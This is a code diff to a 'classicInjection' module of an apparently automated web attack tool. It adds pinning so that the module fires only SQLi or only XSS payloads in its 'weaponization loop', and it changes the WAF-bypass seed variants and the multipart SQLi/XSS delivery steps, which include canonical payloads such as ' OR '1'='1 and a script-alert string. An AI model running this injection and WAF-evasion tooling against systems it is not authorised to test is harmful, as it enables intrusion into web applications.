@@ -68,7 +68,22 @@ export const classicInjection: TechniquePrimitive = {
     // Load and merge payloads (static from PayloadStore + LLM-crafted)
     const payloadResult = loadPayloads(ctx)
 
+    // Precision gating: when the caller pins a payload category (the
+    // weaponization loop narrows to the proven sink class), fire ONLY that
+    // class. Boolean-blind/SLEEP sections are SQLi techniques — meaningless
+    // on XSS strings (different reflections would even false-positive the
+    // differential) — so they run exclusively for sqli pins. Unpinned
+    // callers get the exact historical volley (zero behavior change).
+    const pinnedCategory = ctx.payloadSet?.category
+    const pinnedKind = pinnedCategory && /^[a-z]+\//.test(String(pinnedCategory))
+      ? String(pinnedCategory).split('/')[0]
+      : undefined
+    const seedKind = pinnedKind === 'sqli' || pinnedKind === 'xss' ? pinnedKind : undefined
+    const fireSqli = !seedKind || seedKind === 'sqli'
+    const fireXss = !seedKind || seedKind === 'xss'
+
     // Generate SQLi steps from merged payloads
+    if (fireSqli) {
     payloadResult.bySource.static.forEach((p, i) => {
       const stepUrl = urlWithParam(url, param, p)
       const body = method !== 'GET' ? JSON.stringify({ [param]: p }) : undefined
@@ -80,8 +95,10 @@ export const classicInjection: TechniquePrimitive = {
         metadata: { kind: 'sqli', param, payload: p },
       })
     })
+    }
 
     // Generate XSS steps from merged payloads
+    if (fireXss) {
     payloadResult.bySource.static.forEach((p, i) => {
       const stepUrl = urlWithParam(url, param, p)
       const body = method !== 'GET' ? JSON.stringify({ [param]: p }) : undefined
@@ -93,8 +110,10 @@ export const classicInjection: TechniquePrimitive = {
         metadata: { kind: 'xss', param, payload: p },
       })
     })
+    }
 
     // Blind payloads (hardcoded fallbacks for schema migration)
+    if (fireSqli) {
     const blindPayloads = payloadResult.bySource.static.length > 0
       ? payloadResult.bySource.static.slice(0, 2)
       : getPayloadStore().getPayloads('sqli/boolean-blind')
@@ -132,12 +151,17 @@ export const classicInjection: TechniquePrimitive = {
       expectedSignal: 'response delayed (SLEEP)',
       metadata: { kind: 'sqli-time', param, payload: SQLI_TIME },
     })
-    // WAF-bypass: encoded variants of a canonical SQLi + XSS payload. A backend
+    }
+    // WAF-bypass: encoded variants of seed payloads. A backend
     // that decodes before use reflects the real payload past a naive WAF.
-    const wafSeeds: Array<{ base: string; kind: 'sqli' | 'xss' }> = [
-      { base: "' OR '1'='1", kind: 'sqli' },
-      { base: '<script>alert(1)</script>', kind: 'xss' },
-    ]
+    // Pinned callers seed from the narrowed set (proven class only);
+    // unpinned callers keep the canonical SQLi + XSS pair (unchanged).
+    const wafSeeds: Array<{ base: string; kind: 'sqli' | 'xss' }> = seedKind
+      ? payloadResult.bySource.static.slice(0, 2).map(base => ({ base, kind: seedKind }))
+      : [
+        { base: "' OR '1'='1", kind: 'sqli' },
+        { base: '<script>alert(1)</script>', kind: 'xss' },
+      ]
     wafSeeds.forEach((seed, si) => {
       wafBypassVariants(seed.base).forEach((variant, vi) => {
         if (variant === seed.base) return // raw already covered above
@@ -153,6 +177,9 @@ export const classicInjection: TechniquePrimitive = {
       })
     })
     // Multipart delivery for a canonical SQLi payload (upload-style handlers).
+    // Skipped for pinned callers: the merged step below already delivers the
+    // narrowed first payload, so the hardcoded canonical would be pure spray.
+    if (!seedKind) {
     steps.push({
       id: 'sqli-multipart',
       description: `Multipart-delivered SQLi into ${param}`,
@@ -165,20 +192,22 @@ export const classicInjection: TechniquePrimitive = {
       expectedSignal: 'database error leaked via multipart param',
       metadata: { kind: 'sqli', multipart: true, param, payload: "' OR '1'='1" },
     })
+    }
 
-    // Use the first SQLi payload for multipart delivery (already loaded via loadPayloads)
+    // Use the first merged payload for multipart delivery (already loaded via loadPayloads)
     const firstSqliPayload = payloadResult.bySource.static[0] ?? "' OR '1'='1"
+    const mergedKind = seedKind ?? 'sqli'
     steps.push({
       id: 'sqli-multipart-merged',
-      description: `Multipart-delivered SQLi into ${param} (from merged payloads)`,
+      description: `Multipart-delivered ${mergedKind === 'xss' ? 'XSS' : 'SQLi'} into ${param} (from merged payloads)`,
       request: {
         method: method === 'GET' ? 'POST' : method,
         url,
         headers: { ...headers, 'content-type': MULTIPART_CT },
         body: multipartBody(param, firstSqliPayload),
       },
-      expectedSignal: 'database error leaked via multipart param',
-      metadata: { kind: 'sqli', multipart: true, param, payload: firstSqliPayload },
+      expectedSignal: mergedKind === 'xss' ? 'payload reflected unescaped via multipart param' : 'database error leaked via multipart param',
+      metadata: { kind: mergedKind, multipart: true, param, payload: firstSqliPayload },
     })
     return steps
   },
